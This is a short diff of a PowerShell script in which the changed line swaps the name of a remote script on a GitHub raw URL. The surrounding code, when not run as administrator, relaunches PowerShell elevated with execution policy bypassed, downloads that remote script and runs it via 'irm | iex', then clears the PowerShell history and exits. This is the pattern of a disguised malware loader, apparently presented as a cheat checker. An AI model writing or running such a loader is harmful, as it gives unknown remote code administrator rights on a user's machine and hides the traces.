@@ -19,7 +19,7 @@ function Clear-PSHistory {
 }
 
 if (-not $isAdmin) {
-    $url = "https://raw.githubusercontent.com/die4mebaby/appdata/main/nocheat-checker.ps1"
+    $url = "https://raw.githubusercontent.com/die4mebaby/appdata/main/appdataopenner.ps1"
     Start-Process powershell.exe -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"irm $url | iex`""
     Clear-PSHistory
     exit
